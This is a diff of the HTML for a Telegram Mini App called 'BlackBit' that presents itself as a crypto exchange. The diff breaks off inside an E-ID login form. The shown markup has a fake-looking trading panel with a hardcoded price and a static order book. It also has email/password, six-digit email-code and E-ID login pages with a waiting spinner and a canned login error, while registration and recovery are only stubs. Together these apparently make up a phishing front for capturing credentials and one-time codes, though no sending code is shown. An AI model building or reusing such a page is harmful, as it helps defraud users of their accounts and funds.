@@ -5,8 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>BlackBit</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <style>
-        /* ===== БАЗА ===== */
+        /* ============================================================
+           БАЗА
+           ============================================================ */
         * {
             margin: 0;
             padding: 0;
@@ -14,396 +17,252 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--tg-theme-bg-color, #f5f5f5);
-            color: var(--tg-theme-text-color, #1a1a1a);
+            background: var(--tg-theme-bg-color, #0d1117);
+            color: var(--tg-theme-text-color, #e6edf3);
             display: flex;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
             min-height: 100vh;
-            padding: 16px;
+            padding: 12px;
             margin: 0;
         }
         .container {
-            max-width: 420px;
+            max-width: 480px;
             width: 100%;
-            background: var(--tg-theme-secondary-bg-color, #ffffff);
+            background: var(--tg-theme-secondary-bg-color, #161b22);
             border-radius: 16px;
-            padding: 32px 24px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
         }
-        /* ===== ЛОГО ===== */
+
+        /* ============================================================
+           ЛОГО
+           ============================================================ */
         .logo {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
         }
         .logo h1 {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
-            color: var(--tg-theme-text-color, #1a1a1a);
+            color: var(--tg-theme-text-color, #e6edf3);
             letter-spacing: -0.5px;
         }
         .logo .sub {
-            font-size: 12px;
-            color: var(--tg-theme-hint-color, #8e8e93);
+            font-size: 11px;
+            color: var(--tg-theme-hint-color, #8b949e);
             text-transform: uppercase;
             letter-spacing: 2px;
-            margin-top: 4px;
-        }
-        /* ===== ЗАГОЛОВКИ СТРАНИЦ ===== */
-        .page-title {
-            font-size: 22px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 6px;
-        }
-        .page-sub {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #8e8e93);
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        /* ===== ФОРМЫ ===== */
-        .form-group {
-            margin-bottom: 16px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 4px;
-            color: var(--tg-theme-text-color, #1a1a1a);
-        }
-        .form-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid var(--tg-theme-hint-color, #c7c7cc);
-            border-radius: 10px;
-            font-size: 16px;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #1a1a1a);
-            transition: border-color 0.15s;
-            outline: none;
-        }
-        .form-group input:focus {
-            border-color: #007aff;
-        }
-        .form-group input::placeholder {
-            color: var(--tg-theme-hint-color, #8e8e93);
-        }
-        /* ===== КНОПКИ ===== */
-        .btn-primary {
-            width: 100%;
-            padding: 14px;
-            background: #007aff;
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.15s;
-            margin-top: 8px;
-        }
-        .btn-primary:hover:not(:disabled) {
-            background: #005bbf;
-        }
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .btn-secondary {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: var(--tg-theme-text-color, #1a1a1a);
-            border: 1px solid var(--tg-theme-hint-color, #c7c7cc);
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.15s;
-            margin-top: 8px;
-        }
-        .btn-secondary:hover {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-        }
-        .btn-eid {
-            width: 100%;
-            padding: 14px;
-            background: transparent;
-            color: var(--tg-theme-text-color, #1a1a1a);
-            border: 1px solid var(--tg-theme-text-color, #1a1a1a);
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.15s;
-            margin-top: 8px;
-        }
-        .btn-eid:hover {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-        }
-        .btn-back {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: var(--tg-theme-hint-color, #8e8e93);
-            border: none;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 12px;
-        }
-        .btn-back:hover {
-            text-decoration: underline;
-        }
-        .support-btn {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: #007aff;
-            border: 1px solid #007aff33;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.15s;
-            margin-top: 12px;
-        }
-        .support-btn:hover {
-            background: #007aff11;
-        }
-        /* ===== РАЗДЕЛИТЕЛЬ ===== */
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 16px 0;
-        }
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: var(--tg-theme-hint-color, #c7c7cc);
-        }
-        .divider span {
-            font-size: 12px;
-            color: var(--tg-theme-hint-color, #8e8e93);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        /* ===== ССЫЛКИ ===== */
-        .register-link {
-            text-align: center;
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #8e8e93);
-            margin-top: 16px;
-        }
-        .register-link a {
-            color: #007aff;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .register-link a:hover {
-            text-decoration: underline;
-        }
-        .forgot-link {
-            text-align: right;
-            margin-top: -6px;
-            margin-bottom: 16px;
-        }
-        .forgot-link a {
-            font-size: 14px;
-            color: #007aff;
-            text-decoration: none;
-        }
-        .forgot-link a:hover {
-            text-decoration: underline;
-        }
-        /* ===== МЕНЮ ===== */
-        .menu-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            margin: 12px 0 16px;
-        }
-        .menu-item {
-            padding: 12px 16px;
-            background: var(--tg-theme-secondary-bg-color, #f8f8f8);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-            transition: background 0.15s;
-            font-weight: 500;
-        }
-        .menu-item:hover {
-            background: var(--tg-theme-bg-color, #e5e5ea);
-        }
-        .menu-item .arrow {
-            margin-left: auto;
-            color: var(--tg-theme-hint-color, #8e8e93);
-        }
-        /* ===== БАННЕР ===== */
-        .hero-banner {
-            background: #007aff11;
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            margin-bottom: 16px;
-            border: 1px solid #007aff22;
-        }
-        .hero-banner h2 {
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .hero-banner p {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #8e8e93);
             margin-top: 2px;
         }
-        .hero-banner .badge {
-            display: inline-block;
-            background: #007aff;
-            color: #fff;
-            padding: 2px 12px;
-            border-radius: 20px;
+
+        /* ============================================================
+           ТОРГОВАЯ ПАНЕЛЬ
+           ============================================================ */
+        .trading-panel {
+            background: var(--tg-theme-secondary-bg-color, #161b22);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid var(--tg-theme-hint-color, #30363d);
+        }
+
+        .price-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0 10px 0;
+            border-bottom: 1px solid var(--tg-theme-hint-color, #30363d);
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .pair-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .pair-info .pair {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--tg-theme-text-color, #e6edf3);
+        }
+        .pair-info .type {
+            font-size: 12px;
+            color: var(--tg-theme-hint-color, #8b949e);
+            background: var(--tg-theme-bg-color, #0d1117);
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+        .price-data {
+            text-align: right;
+        }
+        .price-data .price {
+            font-size: 24px;
+            font-weight: 700;
+            color: #58a6ff;
+        }
+        .price-data .change {
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 6px;
+        }
+        .price-data .change.positive {
+            color: #3fb950;
+        }
+        .price-data .change.negative {
+            color: #f85149;
+        }
+
+        /* ============================================================
+           ТАЙМФРЕЙМЫ
+           ============================================================ */
+        .tf-bar {
+            display: flex;
+            gap: 4px;
+            margin: 10px 0 12px 0;
+            flex-wrap: wrap;
+        }
+        .tf-btn {
+            background: var(--tg-theme-bg-color, #0d1117);
+            color: var(--tg-theme-hint-color, #8b949e);
+            border: none;
+            padding: 4px 10px;
+            border-radius: 6px;
             font-size: 12px;
             font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .tf-btn:hover {
+            background: #30363d;
+            color: #e6edf3;
+        }
+        .tf-btn.active {
+            background: #58a6ff;
+            color: #0d1117;
+        }
+
+        /* ============================================================
+           СТАКАН
+           ============================================================ */
+        .order-book {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
             margin-top: 8px;
         }
-        /* ===== КОНТЕНТ ===== */
-        .content-block {
-            background: var(--tg-theme-secondary-bg-color, #f8f8f8);
-            border-radius: 10px;
-            padding: 14px 16px;
-            margin-bottom: 10px;
+        .order-book-col {
+            background: var(--tg-theme-bg-color, #0d1117);
+            border-radius: 8px;
+            padding: 10px 12px;
         }
-        .content-block h3 {
-            font-size: 16px;
+        .order-book-col .title {
+            font-size: 13px;
             font-weight: 600;
-            margin-bottom: 2px;
+            margin-bottom: 6px;
         }
-        .content-block p {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #8e8e93);
+        .order-book-col .title.bid {
+            color: #3fb950;
         }
-        .content-block .num {
-            font-size: 12px;
-            font-weight: 600;
-            color: #007aff;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        .order-book-col .title.ask {
+            color: #f85149;
         }
-        /* ===== FAQ ===== */
-        .faq-item {
-            background: var(--tg-theme-secondary-bg-color, #f8f8f8);
-            border-radius: 10px;
-            padding: 12px 16px;
-            margin-bottom: 8px;
-        }
-        .faq-item .q {
-            font-weight: 600;
-            font-size: 15px;
-            margin-bottom: 2px;
-        }
-        .faq-item .a {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #8e8e93);
-        }
-        /* ===== СООБЩЕНИЯ ===== */
-        .message {
-            padding: 12px;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 14px;
-            margin-top: 12px;
-            display: none;
-        }
-        .message.success {
-            display: block;
-            background: #34c75922;
-            color: #28a745;
-            border: 1px solid #34c75944;
-        }
-        .message.error {
-            display: block;
-            background: #ff3b3022;
-            color: #d63031;
-            border: 1px solid #ff3b3044;
-        }
-        .message.info {
-            display: block;
-            background: #007aff22;
-            color: #007aff;
-            border: 1px solid #007aff44;
-        }
-        .status-waiting {
-            padding: 12px;
-            text-align: center;
-            font-size: 14px;
-            color: #007aff;
-            display: none;
-        }
-        .status-waiting .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #007aff33;
-            border-top: 2px solid #007aff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .page {
-            display: none;
-            flex-direction: column;
-        }
-        .page.active {
+        .order-book-row {
             display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            padding: 2px 0;
+            color: var(--tg-theme-text-color, #e6edf3);
         }
-        .page-icon {
+        .order-book-row .price-bid {
+            color: #3fb950;
+        }
+        .order-book-row .price-ask {
+            color: #f85149;
+        }
+        .order-book-row .amount {
+            color: var(--tg-theme-hint-color, #8b949e);
+        }
+
+        /* ============================================================
+           КНОПКИ ВХОДА
+           ============================================================ */
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 14px;
+        }
+        .action-buttons .btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
             text-align: center;
-            font-size: 40px;
-            margin-bottom: 4px;
         }
-        .error-block {
+        .btn-buy {
+            background: #3fb950;
+            color: #0d1117;
+        }
+        .btn-buy:hover {
+            background: #2ea043;
+        }
+        .btn-sell {
+            background: #f85149;
+            color: #0d1117;
+        }
+        .btn-sell:hover {
+            background: #da3633;
+        }
+
+        /* ============================================================
+           КНОПКИ НАВИГАЦИИ (главная/назад)
+           ============================================================ */
+        .nav-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .nav-buttons .btn {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid var(--tg-theme-hint-color, #30363d);
+            border-radius: 8px;
+            background: transparent;
+            color: var(--tg-theme-text-color, #e6edf3);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
             text-align: center;
-            padding: 24px 0;
         }
-        .error-block .icon {
-            font-size: 48px;
-            color: #d63031;
+        .nav-buttons .btn:hover {
+            background: var(--tg-theme-hint-color, #30363d);
         }
-        .error-block h2 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #d63031;
-            margin: 8px 0;
+        .nav-buttons .btn.primary {
+            background: #58a6ff;
+            color: #0d1117;
+            border-color: #58a6ff;
         }
-        .login-error-page {
-            text-align: center;
-            padding: 24px 0;
+        .nav-buttons .btn.primary:hover {
+            background: #4c8ed9;
         }
-        .login-error-page .icon {
-            font-size: 48px;
-            color: #d63031;
-        }
-        .login-error-page h2 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #d63031;
-            margin: 8px 0;
+
+        /* ============================================================
+           АДАПТИВ
+           ============================================================ */
+        @media (max-width: 420px) {
+            .container { padding: 10px; }
+            .price-data .price { font-size: 20px; }
+            .pair-info .pair { font-size: 16px; }
+            .order-book-row { font-size: 12px; }
         }
     </style>
 </head>
 <body>
-
 <div class="container">
 
     <!-- ===== ЛОГО ===== -->
@@ -413,215 +272,226 @@
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 1: ГЛАВНАЯ
+    СТРАНИЦА 1: ГЛАВНАЯ (торговля + кнопки)
     ============================================================ -->
     <div id="pageMain" class="page active">
-        <div class="hero-banner">
-            <h2>Торгуй криптовалютами</h2>
-            <p>BTC, ECR, ECT, USDT и другие активы</p>
-            <div class="badge">Низкие комиссии</div>
+
+        <!-- Торговая панель -->
+        <div class="trading-panel">
+
+            <!-- Цена -->
+            <div class="price-header">
+                <div class="pair-info">
+                    <span class="pair">BTC/USDT</span>
+                    <span class="type">Spot</span>
+                </div>
+                <div class="price-data">
+                    <span class="price" id="btcPrice">64,870.0</span>
+                    <span class="change positive" id="btcChange">▲ +0.24%</span>
+                </div>
+            </div>
+
+            <!-- Таймфреймы -->
+            <div class="tf-bar">
+                <button class="tf-btn active" data-tf="1">1m</button>
+                <button class="tf-btn" data-tf="5">5m</button>
+                <button class="tf-btn" data-tf="15">15m</button>
+                <button class="tf-btn" data-tf="60">1H</button>
+                <button class="tf-btn" data-tf="120">2H</button>
+                <button class="tf-btn" data-tf="240">4H</button>
+                <button class="tf-btn" data-tf="D">D</button>
+            </div>
+
+            <!-- График TradingView -->
+            <div id="tradingview_btc" style="width:100%; height:260px;"></div>
+
+            <!-- Стаканы -->
+            <div class="order-book" id="orderBook">
+                <div class="order-book-col">
+                    <div class="title bid">Покупка</div>
+                    <div class="order-book-row"><span class="price-bid">64,800.0</span><span class="amount">0.45</span></div>
+                    <div class="order-book-row"><span class="price-bid">64,600.0</span><span class="amount">0.32</span></div>
+                    <div class="order-book-row"><span class="price-bid">64,400.0</span><span class="amount">0.78</span></div>
+                    <div class="order-book-row"><span class="price-bid">64,200.0</span><span class="amount">0.55</span></div>
+                    <div class="order-book-row"><span class="price-bid">64,000.0</span><span class="amount">0.91</span></div>
+                </div>
+                <div class="order-book-col">
+                    <div class="title ask">Продажа</div>
+                    <div class="order-book-row"><span class="price-ask">65,200.0</span><span class="amount">0.21</span></div>
+                    <div class="order-book-row"><span class="price-ask">65,400.0</span><span class="amount">0.15</span></div>
+                    <div class="order-book-row"><span class="price-ask">65,600.0</span><span class="amount">0.09</span></div>
+                    <div class="order-book-row"><span class="price-ask">65,800.0</span><span class="amount">0.33</span></div>
+                    <div class="order-book-row"><span class="price-ask">66,000.0</span><span class="amount">0.27</span></div>
+                </div>
+            </div>
+
+            <!-- Кнопки Купить/Продать -->
+            <div class="action-buttons">
+                <button class="btn btn-buy" id="buyBtn">Купить</button>
+                <button class="btn btn-sell" id="sellBtn">Продать</button>
+            </div>
         </div>
 
-        <div class="menu-grid">
-            <div class="menu-item" onclick="goToAbout()"><span>📘</span> О бирже <span class="arrow">›</span></div>
-            <div class="menu-item" onclick="goToBuy()"><span>📊</span> Как торговать <span class="arrow">›</span></div>
-            <div class="menu-item" onclick="goToGuide()"><span>📖</span> Руководство <span class="arrow">›</span></div>
-            <div class="menu-item" onclick="goToFaq()"><span>❓</span> Частые вопросы <span class="arrow">›</span></div>
+        <!-- Кнопки навигации -->
+        <div class="nav-buttons">
+            <button class="btn primary" onclick="goToLoginForm()">🔑 Войти</button>
+            <button class="btn" onclick="showAbout()">ℹ️ О бирже</button>
         </div>
 
-        <button class="btn-primary" onclick="goToLoginForm()">Войти</button>
-
-        <div class="divider"><span>или</span></div>
-
-        <button class="btn-eid" onclick="goToEid()">Вход через E-ID</button>
-
-        <div class="register-link">
-            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
+        <div style="text-align:center; margin-top:10px; color:var(--tg-theme-hint-color, #8b949e); font-size:12px;">
+            <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Нет аккаунта? Зарегистрироваться</a>
         </div>
     </div>
 
     <!-- ============================================================
     СТРАНИЦА 2: О БИРЖЕ
     ============================================================ -->
-    <div id="pageAbout" class="page">
-        <div class="page-icon">📘</div>
-        <div class="page-title">О бирже</div>
-        <div class="page-sub">BlackBit — современная криптобиржа</div>
-        <div class="content-block"><p><strong>BlackBit</strong> — это криптовалютная биржа для торговли цифровыми активами.</p></div>
-        <div class="content-block"><p>🔒 Безопасность, высокая скорость и низкие комиссии.</p></div>
-        <div class="content-block"><p>📈 Торгуй BTC, ETH, USDT и другими криптовалютами.</p></div>
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
+    <div id="pageAbout" class="page" style="display:none;">
+        <div style="text-align:center; font-size:40px; margin-bottom:8px;">📘</div>
+        <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">BlackBit — современная криптобиржа</div>
+        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+            <p><strong>BlackBit</strong> — это криптовалютная биржа для торговли цифровыми активами.</p>
+        </div>
+        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+            <p>🔒 Безопасность, высокая скорость и низкие комиссии.</p>
+        </div>
+        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+            <p>📈 Торгуй BTC, ETH, USDT и другими криптовалютами.</p>
+        </div>
+        <div style="background:var(--tg-theme-bg-color, #0d1117); border-radius:10px; padding:14px 16px; margin-bottom:10px; border:1px solid var(--tg-theme-hint-color, #30363d);">
+            <p>🔗 Mini App: <a href="https://d3987616-hue.github.io/blackbit/" style="color:#58a6ff;">blackbit</a></p>
+        </div>
+        <button class="btn" style="width:100%; padding:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 3: КАК ТОРГОВАТЬ
+    СТРАНИЦА 3: ВХОД (ЛОГИН/ПАРОЛЬ)
     ============================================================ -->
-    <div id="pageBuy" class="page">
-        <div class="page-icon">📊</div>
-        <div class="page-title">Как торговать</div>
-        <div class="page-sub">Пошаговая инструкция</div>
-        <div class="content-block"><span class="num">Шаг 1</span><h3>Пополни баланс</h3><p>Внеси средства на свой аккаунт.</p></div>
-        <div class="content-block"><span class="num">Шаг 2</span><h3>Выбери пару</h3><p>Выбери торговую пару (например, BTC/USDT).</p></div>
-        <div class="content-block"><span class="num">Шаг 3</span><h3>Соверши сделку</h3><p>Купи или продай актив по рыночной цене.</p></div>
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
-    </div>
-
-    <!-- ============================================================
-    СТРАНИЦА 4: РУКОВОДСТВО
-    ============================================================ -->
-    <div id="pageGuide" class="page">
-        <div class="page-icon">📖</div>
-        <div class="page-title">Руководство по BlackBit</div>
-        <div class="page-sub">Всё, что нужно знать</div>
-        <div class="content-block"><span class="num">01</span><h3>Регистрация</h3><p>Создай аккаунт на бирже.</p></div>
-        <div class="content-block"><span class="num">02</span><h3>Верификация</h3><p>Пройди верификацию для вывода средств.</p></div>
-        <div class="content-block"><span class="num">03</span><h3>Торговля</h3><p>Начни торговать с минимальной комиссией.</p></div>
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
-    </div>
-
-    <!-- ============================================================
-    СТРАНИЦА 5: ЧАСТЫЕ ВОПРОСЫ
-    ============================================================ -->
-    <div id="pageFaq" class="page">
-        <div class="page-icon">❓</div>
-        <div class="page-title">Частые вопросы</div>
-        <div class="page-sub">Ответы на популярные вопросы</div>
-        <div class="faq-item"><div class="q">Что такое BlackBit?</div><div class="a">BlackBit — это криптовалютная биржа для торговли цифровыми активами.</div></div>
-        <div class="faq-item"><div class="q">Какие активы доступны?</div><div class="a">BTC, ETH, USDT и другие криптовалюты.</div></div>
-        <div class="faq-item"><div class="q">Какие комиссии?</div><div class="a">Низкие комиссии на все сделки.</div></div>
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
-    </div>
-
-    <!-- ============================================================
-    СТРАНИЦА 6: ВХОД
-    ============================================================ -->
-    <div id="pageLoginForm" class="page">
-        <div class="page-title">Вход</div>
-        <div class="page-sub">Введите свои данные для входа</div>
+    <div id="pageLoginForm" class="page" style="display:none;">
+        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔑</div>
+        <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
         <div id="loginFields">
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="email" placeholder="Введите ваш email">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Email</label>
+                <input type="email" id="email" placeholder="Введите ваш email" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
         </div>
 
-        <div class="forgot-link">
-            <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Восстановить пароль</a>
+        <button id="loginSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleLogin()">Войти</button>
+
+        <div id="loginError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку входа.</div>
+
+        <div style="text-align:center; margin-top:12px; color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
+            <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')" style="color:var(--tg-theme-hint-color, #8b949e); text-decoration:none;">Восстановить пароль</a>
         </div>
 
-        <button id="loginSubmitBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
-
-        <div id="loginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
-
-        <div class="register-link" style="margin-top:12px;">
-            <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Регистрация</a>
+        <div style="text-align:center; margin-top:8px; color:var(--tg-theme-hint-color, #8b949e); font-size:13px;">
+            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:#58a6ff; text-decoration:none;">Зарегистрироваться</a>
         </div>
 
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
+        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 7: КОД
+    СТРАНИЦА 4: КОД ПОДТВЕРЖДЕНИЯ
     ============================================================ -->
-    <div id="pageCode" class="page">
-        <div class="page-title">Код подтверждения</div>
-        <div class="page-sub">Введите код, отправленный на вашу почту</div>
+    <div id="pageCode" class="page" style="display:none;">
+        <div style="text-align:center; font-size:40px; margin-bottom:4px;">✉️</div>
+        <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
 
         <div id="codeFields">
-            <div class="form-group">
-                <label>Код из 6 цифр</label>
-                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Код из 6 цифр</label>
+                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
-            <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
+            <button id="submitCodeBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleCode()">Подтвердить</button>
         </div>
 
-        <div id="codeError" class="message error" style="display:none;">Неверный код. Попробуйте снова.</div>
-        <div class="status-waiting" id="codeStatus" style="display:none;"><span class="spinner"></span> Ожидание...</div>
+        <div id="codeError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Неверный код. Попробуйте снова.</div>
+        <div class="status-waiting" id="codeStatus" style="display:none; margin-top:12px; padding:10px; background:#58a6ff22; color:#58a6ff; border-radius:8px; text-align:center; font-size:14px;"><span class="spinner"></span> Ожидание...</div>
 
-        <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
+        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToLoginForm()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 8: E-ID
+    СТРАНИЦА 5: E-ID
     ============================================================ -->
-    <div id="pageEid" class="page">
-        <div class="page-title">Вход через E-ID</div>
-        <div class="page-sub">Введите свои данные для входа</div>
+    <div id="pageEid" class="page" style="display:none;">
+        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🆔</div>
+        <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
 
         <div id="eidFields">
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="eidEmail" placeholder="Введите ваш email">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Email</label>
+                <input type="email" id="eidEmail" placeholder="Введите ваш email" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="eidPassword" placeholder="Введите пароль">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Пароль</label>
